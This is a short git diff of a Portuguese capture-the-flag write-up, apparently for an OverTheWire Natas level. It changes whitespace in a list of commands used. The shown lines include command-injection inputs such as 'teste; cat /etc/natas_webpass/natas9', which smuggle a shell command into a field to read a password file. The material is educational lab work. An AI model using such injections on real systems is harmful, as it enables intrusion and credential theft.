@@ -62,7 +62,7 @@ A vulnerabilidade de injeção de comando foi explorada com sucesso, permitindo 
 
 ## 🧪 Comandos Utilizados
 
-`teste; pwd`
+`teste; pwd`  
 `teste; cat /etc/natas_webpass/natas9`
 
 ---
